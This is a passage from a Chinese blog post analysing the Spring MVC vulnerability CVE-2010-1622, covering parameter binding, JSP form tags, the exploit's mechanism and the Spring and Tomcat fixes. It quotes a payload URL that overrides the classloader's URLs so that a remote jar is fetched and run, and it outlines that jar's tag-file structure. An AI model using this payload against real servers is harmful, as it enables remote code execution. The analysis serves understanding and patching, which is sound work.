Bean bean = new com.Person("zhangsan","21");
当然spring
bean还支持多种装配方式，具体可看：[原来Spring的bean是这样装配的](https://juejin.cn/post/6844904106805444621)。
### Spring MVC传递参数
Spring MVC Controller 接收请求参数的方式有很多种，有的适合 get 请求方式，有的适合 post
请求方式，有的两者都适合。主要有以下几种方式：
  1. 通过实体 Bean 接收请求参数
  2. 通过处理方法的形参接收请求参数
  3. 通过 HttpServletRequest 接收请求参数
  4. 通过 @PathVariable 接收 URL 中的请求参数
  5. 通过 @RequestParam 接收请求参数
  6. 通过 @ModelAttribute 接收请求参数
本篇中只介绍下通过Bean来接受请求参数的方法，其它方式请看：[Spring
MVC传递参数](http://c.biancheng.net/spring_mvc/pass-param.html)
Controller如下：
    @RequestMapping("/user")
    public String login(User user, Model model) {
        model.addAttribute("name",user.getName());
        System.out.println(user.getName());
        return "user";
    }
当访问并通过参数赋值时就可以获取到对应的值：
其实上面所描述的就是spring中的参数绑定或者变量覆盖。
**参数嵌套传递或绑定**
除了上述的赋值方法外，当用户传入一个`user.address.street=xxx`这样的值，就相当于执行了如下的传递过程。
    UserObj.getUser().getAddress().setStreet("xxx")
在这个过程中有一个比较有意思的想象就是，当一个变量为数组时，即使没有定义对应的set方法，也可以进行赋值。
在User类中定义一个数组变量
    private String hobbies[] = new String[]{"篮球","唱歌"};
并只设置其get方法：
当访问并赋值时也可以赋值成果， **说明数组变量即使不设置set方法也能赋值** 。这点比较重要，也是cve-2010-1622这个漏洞利用能够成功的关键。
> 对于List,Map类型的字段也有类似的处理，也就是说这三种类型是不需要set方法也能进行参数覆盖。
### Spring MVC表单标签
Spring MVC表单标签是网页的可配置和可重用的构建基块。这些标记为JSP提供了一种开发，读取和维护的简便方法。
Spring
MVC表单标记可以看作是具有数据绑定意识的标记，可以将数据自动设置为Java对象/bean并从中检索它。在这里，每个标签都支持与其对应的HTML标签对应物的属性集，从而使标签变得熟悉且易于使用。
表单标签库位于spring-webmvc.jar下。要启用对表单标签库的支持，需要参考一些配置。因此，在JSP页面的开头添加以下指令:
常用的表单标签有：
例如，当在jsp页面中使用了如下form标签
前端渲染出来后就是如下页面：
其它标签也类似。
### jsp jstl
JSP标准标签库（JSTL）是一个JSP标签集合，它封装了JSP应用的通用核心功能。
JSTL支持通用的、结构化的任务，比如迭代，条件判断，XML文档操作，国际化标签，SQL标签。 除了这些，它还提供了一个框架来使用集成JSTL的自定义标签。
简单理解就是jstl就是一系列的标签库，上边色spring表单标签就是spring内置的jstl,当然我们也可以自定义jstl，cve-2010-1622漏洞最后的命令执行也正是基于这一点来实现的。
关于jstl可以看此教程：[JSP 标准标签库（JSTL）](https://www.runoob.com/jsp/jsp-jstl.html)
关于如何自定义taglib，以及jstl各标签的详细解释可以看这里：
[Custom Tags in JSP
Pages](https://docs.oracle.com/cd/E19316-01/819-3669/6n5sg7b50/index.html)
## cve-2010-1622 payload分析
payload如下：
    http://localhost:8080/student?class.classLoader.URLs[0]=jar:http://127.0.0.1:8081/spring-jar.jar!/
通过覆盖classLoader.URLs来远程加载jra包达到rce的目的。
这里有几个问题。
**1\. jar包里面的内容是啥，应该如何写？**
这里jar包里面的内容其实就是我们自定义的jstl标签，结构如下：
spring-form.tld内容如下：
        Spring Framework JSP Form Tag Library
        3.0
        form
        http://www.springframework.org/tags/form
            input
            /META-INF/tags/InputTag.tag
            form
            /META-INF/tags/InputTag.tag
InputTag.tag内容如下：
InputTag.tag 里面正是存放命令执行语句的最终位置。
可以看到spring-form.tld中重新定义了input和form标签的位置，导致通过classLoader重新加载jar包后就会覆盖原有的Spring
MVC表单标签，导致了执行InputTag.tag中的命令。
**2\. 为什么要修改class.classLoader.URLs[0]的值？**
从上面的前置知识中可以得知任何类的基类都有一个Class对象，并且通过内省机制都可以获取对应的getClass方法，而在渲染jsp页面时，Spring会通过Jasper中的TldLocationsCache类（jsp平台对jsp解析时用到的类）从WebappClassLoader里面读取url参数（用来解析TLD文件在解析TLD的时候，是允许直接使用jsp语法的）在init时通过scanJars方法依次读取并加载。
相关代码可以看：[TldLocationsCache.java](https://alvinalexander.com/java/jwarehouse/apache-tomcat-6.0.16/java/org/apache/jasper/compiler/TldLocationsCache.java.shtml)
这里把重点代码贴出来：
    private void scanJars() throws Exception {
            ClassLoader webappLoader
                = Thread.currentThread().getContextClassLoader();
            ClassLoader loader = webappLoader;
            while (loader != null) {
                if (loader instanceof URLClassLoader) {
                    URL[] urls = ((URLClassLoader) loader).getURLs();
                    for (int i=0; i result = new ArrayList<>();
            result.addAll(localRepositories);
            result.addAll(Arrays.asList(super.getURLs()));
            return result.toArray(new URL[0]);
        }
注意看这里：
    URL[] urls = ((URLClassLoader) loader).getURLs();
和这里
    String urlStr = urls[i].toString();
    URL jarURL = new URL("jar:" + urlStr + "!/");
现在思路明确了，只要修改urls，即可修改jarURL的值，从而加载远程jar包中的内容。
修改urls即使修改getURLs函数。
**2\. URL[]对象并没有setter为什么可以对其赋值呢？**
在上文中已经说明了当变量为数组时，即使没有对应的set方法，spring也会对其进行java 内省操作。
所以通过`class.classLoader.URLs[0]`即可实现对`webappLoader`中的getURLs赋值。
就相当于执行了
    class.getClassLoader.getURLs = jar:http://127.0.0.1:8081/spring-jar.jar!/
最终漏洞复现结果：
简单总结下主要流程：
    exp->参数自动绑定->数组覆盖classLoader.URLs[0]->WebappClassLoader.getURLs()->TldLocationsCache.scanJars()->模板解析->shellcode
## cve-2010-1622 漏洞修复方法
spring修复方法：
spring在CachedIntrospectionResults中获取beanInfo后对其进行了判断，将classloader添加进了黑名单。
tomcat修复方法：
tomcat6.0.28版本后把getURLs方法返回的值改成了clone的，使得我们获得的拷贝版本无法修改classloader中的URLs[]。
## 后记
cve-2010-1622的漏洞分析就到这里了，有了这些前置知识，下篇文章对CVE-2022-22965漏洞的分析将会简单许多。
## 参考文章
  * [SpringMVC + Intellij + Tomcat环境部署](https://juejin.cn/post/6992715463461437454)
  * [Spring MVC表单处理](https://www.yiibai.com/spring_mvc/springmvc_form_handling.html)
  * [CREATE CUSTOM TAGS IN SPRING MVC FRAMEWORK](https://learningprogramming.net/java/spring-mvc/create-custom-tags-in-spring-mvc-framework/)
  * [CVE-2010-1622](http://blog.o0o.nu/2010/06/cve-2010-1622.html)
  * [SpringMVC框架任意代码执行漏洞(CVE-2010-1622)分析](http://rui0.cn/archives/1158)
  * [Spring framework（cve-2010-1622）漏洞利用指南](https://www.inbreak.net/archives/377)
  * [cve-2010-1622 漏洞全分析](https://blog.csdn.net/dingodingy/article/details/84705444)